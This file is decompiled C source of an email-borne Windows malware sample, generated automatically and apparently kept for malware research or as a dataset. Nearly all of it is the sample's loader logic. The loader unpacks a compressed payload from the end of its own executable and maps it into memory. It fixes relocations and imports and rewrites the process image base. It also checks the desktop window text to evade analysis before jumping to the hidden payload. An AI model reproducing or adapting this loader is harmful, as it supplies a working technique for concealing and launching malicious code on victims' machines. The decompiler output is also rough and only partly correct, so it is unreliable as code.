// subject.c
// Generated on 5/4/2015 1:17:28 AM by decompiling malware_via_email/malware_0586/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

void fn00401000(Eq_616 * dwArg04, Eq_616 * dwArg08, Eq_144 dwArg0C)
{
	int32 dwLoc08_15 = 0x00000000;
	while (dwLoc08_15 < dwArg0C)
	{
		dwArg04[dwLoc08_15] = dwArg08[dwLoc08_15];
		dwLoc08_15 = dwLoc08_15 + 0x00000001;
	}
	return;
}

word32 * fn00401040(word32 * ebp, word32 dwArg04, Eq_142 dwArg08, Eq_409 dwArg0C)
{
	if (dwArg0C <u 0x00000001)
		;
	else
	{
		byte cl_48 = *dwArg04;
		up32 dwLoc0C_115 = 0x00000001;
		word32 dwLoc18_111 = 0x00000000;
		do
		{
			up32 ecx_66 = dwLoc0C_115 + 0x00000001;
			byte al_63 = dwArg04[dwLoc0C_115];
			dwLoc0C_115 = ecx_66;
			if ((word32) al_63 != (word32) cl_48)
			{
				dwArg08[dwLoc18_111] = al_63;
				dwLoc18_111 = dwLoc18_111 + 0x00000001;
			}
			else if ((word32) dwArg04[ecx_66] == 0x00000000)
			{
				dwArg08[dwLoc18_111] = cl_48;
				dwLoc18_111 = dwLoc18_111 + 0x00000001;
				dwLoc0C_115 = ecx_66 + 0x00000001;
			}
			else
			{
				word32 eax_126 = fn00401150(fp - 0x00000010, dwArg04 + ecx_66) + ecx_66;
				dwLoc0C_115 = fn00401150(fp - 0x00000024, dwArg04 + eax_126) + eax_126;
				up32 dwLoc1C_141 = 0x00000000;
				while (dwLoc1C_141 <u dwLoc10)
				{
					dwArg08[dwLoc18_111] = dwArg08[dwLoc18_111 - dwLoc24];
					dwLoc18_111 = dwLoc18_111 + 0x00000001;
					dwLoc1C_141 = dwLoc1C_141 + 0x00000001;
				}
			}
		} while (dwLoc0C_115 <u dwArg0C);
	}
}

word32 fn00401150(word32 dwArg04, word32 dwArg08)
{
	word32 dwLoc08_12 = 0x00000000;
	word32 dwLoc14_13 = 0x00000000;
	do
	{
		word32 ecx_16 = (word32) dwArg08->b0000;
		word32 eax_25 = dwLoc08_12 << 0x00000007 | ecx_16 & 0x0000007F;
		word32 edx_28 = dwLoc14_13 + 0x00000001;
		dwArg08 = dwArg08 + 1;
		dwLoc08_12 = eax_25;
		dwLoc14_13 = edx_28;
	} while ((ecx_16 & 0x00000080) != 0x00000000);
	*dwArg04 = eax_25;
	return edx_28;
}

word32 fn004011B0(word32 dwArg04)
{
	word32 eax_28;
	word32 eax_23 = CreateFileA(dwArg04, 0x80000000, 0x00000001, 0x00000000, 0x00000003, 0x00000080, 0x00000000);
	if (eax_23 == 0xFFFFFFFF)
		eax_28 = 0x00000000;
	else
		eax_28 = eax_23;
	return eax_28;
}

void fn004011F0(word32 ebx, word32 ebp, word32 esi, word32 edi, selector fs, word32 dwArg04, word32 dwArg08)
{
	GetModuleHandleA(0x00000000);
	LoadIconA(GetModuleHandleA(0x00000000), 0x00403000);
	LoadCursorA(0x00000000, 0x00007F00);
	word16 ax_51 = (word16) RegisterClassA(fp - 0x00000060);
	if ((word32) ax_51 == 0x00000000)
	{
l004015BD:
		return;
	}
	else
	{
		if (dwArg08 != 0x00000001)
			Mem504[0x00403050:word32] = 0x00000000;
		else
		{
			Mem505[0x00403050:word32] = 0x00000001;
			Mem507[0x00403040:word32] = dwArg04;
		}
		word32 dwLoc20_218;
		byte cl_182 = (byte) (dwLoc10 + 0x000F7061);
		Mem184[0x00403060:word32] = dwLoc10 - Mem0[0x00403038:word32] - 0x0006CAAB << 0x00000033 >> cl_182;
		Mem188[fp - 0x00000084:word32] = 0x00000000;
		Mem192[fp - 0x00000084:word32] = GetModuleHandleA(0x00000000);
		CreateWindowExA(0x00000000, 0x00403020, 0x00403018, 0x00000001, 0x00011779, 0x00024256, 0x05536774, 0x00044318, 0x00000000, 0x00000000, 0x00000000, 0x00000000);
		if (Mem192[0x00403050:word32] == 0x00000000)
		{
			Mem497[fp - 0x00000080:word32] = 0x00000000;
			dwLoc20_218 = GetModuleHandleA(0x00000000);
		}
		else
			dwLoc20_218 = dwArg04;
		word32 eax_223 = dwLoc20_218 + Mem192[dwLoc20_218 + 0x0000003C:word32];
		word32 eax_234 = ((word32) Mem192[eax_223 + 0x00000006:word16] - 0x00000001) *s 0x00000028 + ((eax_223 + 0x00000018) + (word32) Mem192[eax_223 + 0x00000014:word16]);
		word32 eax_240 = Mem192[eax_234 + 0x00000010:word32] - 0x00000001 + Mem192[eax_223 + 0x0000003C:word32];
		word32 eax_250 = SEQ(SEQ(0x00000000, eax_240) % Mem192[eax_223 + 0x0000003C:word32], eax_240) /u Mem192[eax_223 + 0x0000003C:word32] *s Mem192[eax_223 + 0x0000003C:word32] + Mem192[eax_234 + 0x00000014:word32];
		Mem254[fp - 0x00000080:word32] = 0x00000200;
		word32 eax_255 = fn00401D40(0x00000000);
		if (eax_255 == 0x00000000)
			goto l004015BD;
		else
		{
			Mem264[fp - 0x00000080:word32] = 0x00000200;
			Mem270[fp - 0x00000088:word32] = dwLoc20_218;
			GetModuleFileNameA(0x00000000, eax_255, 0x00000200);
			Mem275[fp - 0x00000080:word32] = eax_255;
			word32 eax_276 = fn004011B0(0x00000000);
			if (eax_276 == 0x00000000)
				goto l004015BD;
			else
			{
				word32 eax_291 = GetFileSize(eax_276, 0x00000000) - eax_250;
				if (eax_291 == 0x00000000)
					goto l004015BD;
				else
				{
					Mem302[fp - 0x00000080:word32] = eax_291 + 0x00000010;
					word32 eax_303 = fn00401D40(0x00000000);
					if (eax_303 == 0x00000000)
						goto l004015BD;
					else
					{
						Mem320[fp - 0x0000008C:word32] = eax_276;
						SetFilePointer(0x00000000, eax_250, 0x00000000, 0x00000000);
						Mem333[fp - 0x0000008C:word32] = eax_303;
						Mem336[fp - 0x00000090:word32] = eax_276;
						if (ReadFile(0x00044318, 0x00000000, eax_291, fp - 0x00000028, 0x00000000) == 0x00000000)
							goto l004015BD;
						else
						{
							Mem347[fp - 0x00000080:word32] = eax_276;
							CloseHandle(0x00000000);
							if (dwLoc28 != eax_291)
								goto l004015BD;
							else
							{
								word32 eax_357 = GetDesktopWindow();
								word32 eax_361 = fn00401D40(0x000000C8);
								Mem365[eax_361 + 0x00000000:byte] = 0x01;
								GetWindowTextA(eax_357, eax_361, 0x000000C8);
								if ((word32) Mem365[eax_361 + 0x00000000:byte] == 0x00000000)
								{
									Mem383[fp - 0x00000080:word32] = eax_361;
									fn00401D10(0x000000C8);
									memcpy(eax_303, eax_303 - 0x00000040 + eax_291, 0x00000040);
									word32 eax_400 = Mem383[eax_303 + 0x00000000:word32];
									Mem410[0x0040304C:word32] = fn00401D40(Mem383[eax_303 + 0x00000004:word32]);
									if (Mem410[0x0040304C:word32] == 0x00000000)
										ExitProcess(0x00000351);
									word32 esp_444;
									word32 ebp_424 = fn00401040(fp - 0x00000004, eax_303 + 0x00000008, Mem410[0x0040304C:word32], eax_400);
									Mem426[0x0040303C:word32] = edi;
									Mem427[0x00403034:word32] = esi;
									Mem428[0x00403048:word32] = ebx;
									Mem429[0x00403044:word32] = ebp_424;
									Mem432[fp - 0x00000080:word32] = 0x00401571;
									Mem435[ebp_424 - 0x00000008:word32] = Mem432[fp - 0x00000080:word32];
									Mem438[0x00403058:word32] = Mem435[fs:0x00000018:word32];
									if (Mem438[0x00403050:word32] != 0x00000000)
									{
										Mem472[fp - 0x00000080:word32] = Mem438[ebp_424 - 0x00000008:word32] - Mem438[0x00403040:word32];
										fn004015D0(dwArg00);
										esp_444 = fp - 0x0000007C;
									}
									else
									{
										Mem476[fp - 0x00000080:word32] = 0x00000000;
										Mem483[fp - 0x00000080:word32] = Mem476[ebp_424 - 0x00000008:word32] - GetModuleHandleA(Mem476[fp - 0x00000080:LPCSTR]);
										fn004015D0(dwArg00);
										esp_444 = fp - 0x0000007C;
									}
									word32 esp_446 = esp_444 - 0x00000004;
									Mem447[esp_446 + 0x00000000:word32] = Mem438[0x0040304C:word32];
									word32 eax_449 = fn00401740(dwArg00);
									if (eax_449 == 0x00000000)
									{
										Mem462[esp_446 + 0x00000000:word32] = Mem447[0x0040304C:word32];
										fn00401D10(dwArg00);
										Mem466[esp_446 + 0x00000000:word32] = 0x00006188;
										ExitProcess(Mem466[esp_446 + 0x00000000:UINT]);
									}
									Mem447[0x0040305C:word32]();
									return;
								}
								else
								{
									Mem491[fp - 0x00000080:word32] = eax_361;
									fn00401D10(0x000000C8);
									goto l004015BD;
								}
							}
						}
					}
				}
			}
		}
	}
}

void fn004015D0(word32 dwArg04)
{
fn004015D0_entry:
l004015D0:
	word32 dwLoc24_13
	branch Mem0[0x00403050:word32] == 0x00000000 l004015EA
l004015E0:
	dwLoc24_13 = Mem0[0x00403040:word32]
	goto l004015F5
l004015EA:
	dwLoc2C = 0x00000000
	dwLoc24_13 = GetModuleHandleA(0x00000000)
l004015F5:
	branch dwLoc24_13 != 0x00000000 l00401602
l004015FB:
	goto l00401730
l00401602:
	word32 edx_45 = dwLoc24_13 + Mem0[dwLoc24_13 + 0x0000003C:word32]
	Mem48[fp - 0x0000002C:word32] = 0x00000040
	Mem59[0x00403054:word32] = VirtualAlloc(0x00000000, Mem48[edx_45 + 0x00000050:word32], 0x00003000, 0x00000000)
	branch Mem59[0x00403054:word32] != 0x00000000 l00401639
l00401632:
	goto l00401730
l00401639:
	Mem68[fp - 0x0000002C:word32] = Mem59[edx_45 + 0x00000050:word32]
	Mem71[fp - 0x00000030:word32] = dwLoc24_13
	fn00401000(Mem71[0x00403054:word32], 0x00003000, dwLoc2C)
	word32 eax_77 = Mem71[0x00403054:word32] - dwLoc24_13
	branch Mem71[edx_45 + 0x000000A4:word32] == 0x00000000 l0040171E
l0040166E:
	word32 dwLoc0C_108 = dwLoc24_13 + Mem71[edx_45 + 0x000000A0:word32]
l0040167D:
	branch Mem71[dwLoc0C_108 + 0x00000004:word32] == 0x00000000 l0040171E
l0040168A:
	word32 eax_123 = Mem71[dwLoc0C_108 + 0x00000004:word32] - 0x00000008 >>u 0x00000001
	word32 ecx_126 = dwLoc0C_108 + 0x00000008
	word32 dwLoc08_129 = 0x00000000
	goto l004016B3
l004016AA:
	dwLoc08_129 = dwLoc08_129 + 0x00000001
l004016B3:
	branch dwLoc08_129 >=u eax_123 l0040170D
l004016BB:
	branch (word32) ecx_126[dwLoc08_129 * 0x0002] >> 0x0000000C != 0x00000003 l0040170B
l004016CD:
	Mem170[Mem71[0x00403054:word32] + Mem71[dwLoc0C_108 + 0x00000000:word32] + ((word32) ecx_126[dwLoc08_129 * 0x0002] & 0x00000FFF):word32] = Mem71[Mem71[0x00403054:word32] + Mem71[dwLoc0C_108 + 0x00000000:word32] + ((word32) ecx_126[dwLoc08_129 * 0x0002] & 0x00000FFF):word32] + eax_77
l0040170B:
	goto l004016AA
l0040170D:
	dwLoc0C_108 = dwLoc0C_108 + Mem71[dwLoc0C_108 + 0x00000004:word32]
	goto l0040167D
l0040171E:
l00401730:
	return
fn004015D0_exit:
}

word32 fn00401740(word32 dwArg04)
{
	word32 eax_249;
	word32 edx_16 = dwArg04 + Mem0[dwArg04 + 0x0000003C:word32];
	word32 dwLoc24_109 = edx_16 + 0x00000018 + (word32) Mem0[edx_16 + 0x00000014:word16];
	word32 eax_33 = VirtualAlloc(0x00000000, Mem0[edx_16 + 0x00000050:word32], 0x00003000, 0x00000040);
	if (eax_33 == 0x00000000)
		eax_249 = 0x00000000;
	else
	{
		Mem94[fp - 0x0000004C:word32] = Mem0[dwArg04 + 0x0000003C:word32] + 0x00000138 + (word32) Mem0[edx_16 + 0x00000006:word16] *s 0x00000028;
		Mem97[fp - 0x00000050:word32] = dwArg04;
		fn00401000(eax_33, 0x00003000, 0x00000040);
		word32 dwLoc0C_103 = 0x00000000;
		while (dwLoc0C_103 <u (word32) Mem97[edx_16 + 0x00000006:word16])
		{
			if (Mem97[dwLoc24_109 + 0x00000014:word32] != 0x00000000 && Mem97[dwLoc24_109 + 0x00000010:word32] != 0x00000000)
			{
				word32 eax_144 = Mem97[dwLoc24_109 + 0x00000010:word32] - 0x00000001 + Mem97[edx_16 + 0x0000003C:word32];
				fn00401000(eax_33 + Mem97[dwLoc24_109 + 0x0000000C:word32], dwArg04 + Mem97[dwLoc24_109 + 0x00000014:word32], SEQ(SEQ(0x00000000, eax_144) % Mem97[edx_16 + 0x0000003C:word32], eax_144) /u Mem97[edx_16 + 0x0000003C:word32] *s Mem97[edx_16 + 0x0000003C:word32]);
			}
			dwLoc24_109 = dwLoc24_109 + 0x00000028;
			dwLoc0C_103 = dwLoc0C_103 + 0x00000001;
		}
		word32 ecx_172 = eax_33 + Mem97[eax_33 + 0x0000003C:word32];
		word32 dwLoc44_178 = eax_33 + Mem97[ecx_172 + 0x00000080:word32];
		while (Mem97[dwLoc44_178 + 0x00000010:word32] != 0x00000000)
		{
			word32 eax_200 = GetModuleHandleA(eax_33 + Mem97[dwLoc44_178 + 0x0000000C:word32]);
			word32 dwLoc14_202 = eax_200;
			if (eax_200 == 0x00000000)
			{
				if (Mem97[0x00403050:word32] != 0x00000000)
				{
					eax_249 = 0x00000000;
					goto l00401C5F;
				}
				word32 eax_327 = LoadLibraryA(eax_33 + Mem97[dwLoc44_178 + 0x0000000C:word32]);
				dwLoc14_202 = eax_327;
				if (eax_327 == 0x00000000)
				{
					eax_249 = 0x00000000;
					goto l00401C5F;
				}
				goto l004018A8;
			}
l004018A8:
			word32 dwLoc30_214;
			word32 dwLoc20_213;
			if (Mem97[dwLoc44_178 + 0x00000000:word32] != 0x00000000)
			{
				dwLoc20_213 = eax_33 + Mem97[dwLoc44_178 + 0x00000000:word32];
				dwLoc30_214 = eax_33 + Mem97[dwLoc44_178 + 0x00000010:word32];
			}
			else
			{
				dwLoc20_213 = eax_33 + Mem97[dwLoc44_178 + 0x00000010:word32];
				dwLoc30_214 = eax_33 + Mem97[dwLoc44_178 + 0x00000000:word32];
			}
			if (Mem97[dwLoc44_178 + 0x00000010:word32] != 0x00000000 && Mem97[dwLoc44_178 + 0x00000000:word32] != 0x00000000)
			{
				Mem301[fp - 0x00000010:word32] = 0x00000001;
				goto l004018FF;
			}
l004018FF:
			while (Mem97[dwLoc20_213 + 0x00000000:word32] != 0x00000000)
			{
				if ((Mem97[dwLoc20_213 + 0x00000000:word32] & 0x80000000) != 0x00000000)
					Mem280[dwLoc20_213 + 0x00000000:word32] = GetProcAddress(dwLoc14_202, Mem97[dwLoc20_213 + 0x00000000:word32] & 0x7FFFFFFF);
				else
					Mem293[dwLoc20_213 + 0x00000000:word32] = GetProcAddress(dwLoc14_202, Mem97[dwLoc20_213 + 0x00000000:word32] + 0x00000002 + eax_33);
				if (Mem97[dwLoc20_213 + 0x00000000:word32] == 0x00000000)
				{
					eax_249 = 0x00000000;
					goto l00401C5F;
				}
				if (0x00000000 != 0x00000000)
					Mem266[dwLoc30_214 + 0x00000000:word32] = Mem97[dwLoc20_213 + 0x00000000:word32];
				dwLoc20_213 = dwLoc20_213 + 0x00000004;
				dwLoc30_214 = dwLoc30_214 + 0x00000004;
			}
			dwLoc44_178 = dwLoc44_178 + 0x00000014;
		}
		if (Mem97[0x00403050:word32] != 0x00000000)
		{
			word32 edx_618 = Mem97[0x00403040:word32] - Mem97[ecx_172 + 0x00000034:word32];
			if (Mem97[ecx_172 + 0x000000A4:word32] != 0x00000000)
			{
				word32 dwLoc18_627 = eax_33 + Mem97[ecx_172 + 0x000000A0:word32];
				while (Mem97[dwLoc18_627 + 0x00000004:word32] != 0x00000000)
				{
					word32 edx_642 = Mem97[dwLoc18_627 + 0x00000004:word32] - 0x00000008 >>u 0x00000001;
					word32 eax_645 = dwLoc18_627 + 0x00000008;
					word32 dwLoc0C_648 = 0x00000000;
					while (dwLoc0C_648 <u edx_642)
					{
						if ((word32) eax_645[dwLoc0C_648 * 0x0002] >> 0x0000000C == 0x00000003)
							Mem689[eax_33 + Mem97[dwLoc18_627 + 0x00000000:word32] + ((word32) eax_645[dwLoc0C_648 * 0x0002] & 0x00000FFF):word32] = Mem97[eax_33 + Mem97[dwLoc18_627 + 0x00000000:word32] + ((word32) eax_645[dwLoc0C_648 * 0x0002] & 0x00000FFF):word32] + edx_618;
						dwLoc0C_648 = dwLoc0C_648 + 0x00000001;
					}
					dwLoc18_627 = dwLoc18_627 + Mem97[dwLoc18_627 + 0x00000004:word32];
				}
			}
		}
		word32 eax_353 = Mem97[ecx_172 + 0x00000050:word32];
		Mem359[fp - 0x00000058:word32] = 0x00000004;
		word32 eax_364 = CreateFileMappingA(0xFFFFFFFF, 0x00000000, 0x00000000, 0x00000000, eax_353, 0x00000000);
		if (eax_364 == 0x00000000)
			eax_249 = 0x00000000;
		else
		{
			if (Mem359[0x00403050:word32] != 0x00000000)
			{
				Mem583[fp - 0x0000004C:word32] = Mem359[0x00403040:word32];
				Mem587[fp - 0x00000054:word32] = 0x00000000;
				Mem589[fp - 0x00000058:word32] = 0x00000000;
				Mem591[fp - 0x0000005C:word32] = 0x00000022;
				Mem594[fp - 0x00000060:word32] = eax_364;
				Mem597[0x00403054:word32] = MapViewOfFileEx(0xFFFFFFFF, 0x00000000, 0x00000004, 0x00000000, 0x00000000, 0x00000000);
			}
			else
			{
				Mem601[fp - 0x0000004C:word32] = Mem359[ecx_172 + 0x00000034:word32];
				Mem605[fp - 0x00000054:word32] = 0x00000000;
				Mem607[fp - 0x00000058:word32] = 0x00000000;
				Mem609[fp - 0x0000005C:word32] = 0x00000022;
				Mem612[fp - 0x00000060:word32] = eax_364;
				Mem615[0x00403054:word32] = MapViewOfFileEx(0xFFFFFFFF, 0x00000000, 0x00000004, 0x00000000, 0x00000000, 0x00000000);
			}
			if (Mem359[0x00403054:word32] != 0x00000000)
				goto l00401BF0;
			else if (Mem359[0x00403050:word32] == 0x00000000)
				if (UnmapViewOfFile(Mem359[ecx_172 + 0x00000034:word32]) == 0x00000000)
				{
					Mem567[fp - 0x00000050:word32] = 0x00000000;
					Mem571[fp - 0x00000054:word32] = Mem567[ecx_172 + 0x00000034:word32];
					if (VirtualFree(0x00000000, 0x00000000, 0x00008000) == 0x00000000)
						eax_249 = 0x00000000;
					else
						goto l00401B49;
				}
				else
					goto l00401B49;
			else if (UnmapViewOfFile(Mem359[0x00403040:word32]) == 0x00000000)
			{
				Mem542[fp - 0x00000050:word32] = 0x00000000;
				Mem545[fp - 0x00000054:word32] = Mem542[0x00403040:word32];
				if (VirtualFree(0x00000000, 0x00000000, 0x00008000) == 0x00000000)
					eax_249 = 0x00000000;
				else
				{
l00401B17:
l00401B49:
					if (Mem359[0x00403050:word32] != 0x00000000)
					{
						word32 eax_489 = Mem359[0x00403040:word32];
						Mem493[fp - 0x00000050:word32] = 0x00000000;
						Mem497[fp - 0x00000058:word32] = 0x00000000;
						Mem499[fp - 0x0000005C:word32] = 0x00000022;
						Mem505[0x00403054:word32] = MapViewOfFileEx(eax_364, 0x00000022, 0x00000000, 0x00000000, 0x00000000, eax_489);
					}
					else
					{
						word32 eax_507 = Mem359[ecx_172 + 0x00000034:word32];
						Mem511[fp - 0x00000050:word32] = 0x00000000;
						Mem515[fp - 0x00000058:word32] = 0x00000000;
						Mem517[fp - 0x0000005C:word32] = 0x00000022;
						Mem523[0x00403054:word32] = MapViewOfFileEx(eax_364, 0x00000022, 0x00000000, 0x00000000, 0x00000000, eax_507);
					}
					if (Mem359[0x00403054:word32] != 0x00000000)
						goto l00401BF0;
					else
					{
						if (Mem359[0x00403050:word32] != 0x00000000)
						{
							Mem463[fp - 0x00000050:word32] = 0x00003000;
							Mem467[fp - 0x00000054:word32] = Mem463[ecx_172 + 0x00000050:word32];
							Mem470[fp - 0x00000058:word32] = Mem467[0x00403040:word32];
							Mem473[0x00403054:word32] = VirtualAlloc(0x00000000, 0x00000000, 0x00000000, 0x00000040);
						}
						else
						{
							Mem477[fp - 0x00000050:word32] = 0x00003000;
							Mem481[fp - 0x00000054:word32] = Mem477[ecx_172 + 0x00000050:word32];
							Mem485[fp - 0x00000058:word32] = Mem481[ecx_172 + 0x00000034:word32];
							Mem488[0x00403054:word32] = VirtualAlloc(0x00000000, 0x00000000, 0x00000000, 0x00000040);
						}
						if (Mem359[0x00403054:word32] == 0x00000000)
							eax_249 = 0x00000000;
						else
						{
l00401BF0:
							fn00401000(Mem359[0x00403054:word32], eax_33, Mem359[ecx_172 + 0x00000050:word32]);
							if (Mem359[0x00403050:word32] != 0x00000000)
								fn00401C70(Mem359[0x00403040:word32], Mem359[0x00403054:word32] + Mem359[ecx_172 + 0x00000028:word32]);
							else
								fn00401CE0(Mem359[0x00403054:word32]);
							Mem405[0x0040305C:word32] = Mem359[0x00403054:word32] + Mem359[ecx_172 + 0x00000028:word32];
							Mem408[ecx_172 + 0x00000028:word32] = Mem405[0x0040305C:word32];
							eax_249 = 0x00000001;
						}
					}
				}
			}
			else
				goto l00401B17;
		}
	}
l00401C5F:
	return eax_249;
}

void fn00401C70(word32 dwArg04, word32 dwArg08)
{
	word32 ecx_14 = Mem0[Mem0[Mem0[Mem0[0x00403058:word32] + 0x00000030:word32] + 0x0000000C:word32] + 0x0000000C:word32];
	word32 dwLoc10_15 = ecx_14;
	while (0x00000001 != 0x00000000)
	{
		if (dwLoc10_15 == 0x00000000)
			goto l00401CDC;
		if (Mem0[dwLoc10_15 + 0x00000018:word32] == dwArg04)
		{
			Mem50[dwLoc10_15 + 0x0000001C:word32] = dwArg08;
			goto l00401CDC;
		}
		word32 eax_53 = Mem0[dwLoc10_15 + 0x00000000:word32];
		dwLoc10_15 = eax_53;
		if (eax_53 == ecx_14)
			goto l00401CDC;
	}
l00401CDC:
	return;
}

void fn00401CE0(word32 dwArg04)
{
	word32 ecx_10 = Mem0[0x00403058:word32];
	Mem22[Mem0[ecx_10 + 0x00000030:word32] + 0x00000008:word32] = dwArg04;
	return;
}

void fn00401D10(word32 dwArg04)
{
	HeapFree(GetProcessHeap(), 0x00000000, dwArg04);
	return;
}

word32 fn00401D40(word32 dwArg04)
{
	return HeapAlloc(GetProcessHeap(), 0x00000000, dwArg04);
}

